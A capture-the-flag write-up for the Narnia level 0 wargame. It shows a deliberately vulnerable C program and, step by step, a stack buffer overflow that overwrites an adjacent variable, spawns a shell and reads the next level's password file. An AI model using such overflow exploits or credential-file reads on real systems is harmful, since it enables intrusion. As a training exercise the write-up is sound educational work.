@@ -1,0 +1,81 @@
+AAAnd we're back at it!!
+So I guess in this series of problems source is provided (yay!), so for this problem here's said source:
+========================================================================================================
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+	long val=0x41414141;
+	char buf[20];
+
+	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+	printf("Here is your chance: ");
+	scanf("%24s",&buf);
+
+	printf("buf: %s\n",buf);
+	printf("val: 0x%08x\n",val);
+
+	if(val==0xdeadbeef)
+		system("/bin/sh");
+	else {
+		printf("WAY OFF!!!!\n");
+		exit(1);
+	}
+
+	return 0;
+}
+===========================================================================================================
+Cool! so we have scanf() to grab input of size 24 and shove it into buf[20]. 
+Given that buf and val are adjacent stack variables, we can overflow 4 bytes into val from buf.
+===========================================================================================================
+narnia0@melinda:~$ /narnia/narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: BBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+buf: BBBBBBBBBBBBBBBBBBBBBBBB
+val: 0x42424242
+WAY OFF!!!!
+
+Alright so the overflow works :)
+
+narnia0@melinda:~$ python -c'print "B"*20+"\xde\xad\xbe\xef"'|/narnia/narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBޭ��
+val: 0xefbeadde
+WAY OFF!!!!
+
+Crap I forgot about the endieness, let's fix that:
+
+narnia0@melinda:~$ python -c'print "B"*20+"\xef\xbe\xad\xde"'|/narnia/narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
+val: 0xdeadbeef
+
+Siiiick we made it through!!! Let's try to inject some commands into the shell:
+
+narnia0@melinda:~$ python -c'print "B"*20+"\xef\xbe\xad\xde"';whoami|/narnia/narnia0 
+BBBBBBBBBBBBBBBBBBBBﾭ�
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: narnia0
+val: 0x41414141
+WAY OFF!!!!
+
+Hmmm, looks whacky :S why is the output of whoami in the buf field?? I guess the shell isn't opened (WAY OFF!!!!)
+Let's try with a subshell:
+
+narnia0@melinda:~$ (python -c'print "B"*20+"\xef\xbe\xad\xde"';whoami)|/narnia/narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
+val: 0xdeadbeef
+/bin/sh: 1: narnia0: not found
+
+Oh check it out!! we hit /bin/sh!!
+I tried a few other commands, but the shell only stayed open with cat, take a look:
+
+narnia0@melinda:~$ (python -c'print "B"*20+"\xef\xbe\xad\xde"';cat)|/narnia/narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+[...Redacted...]
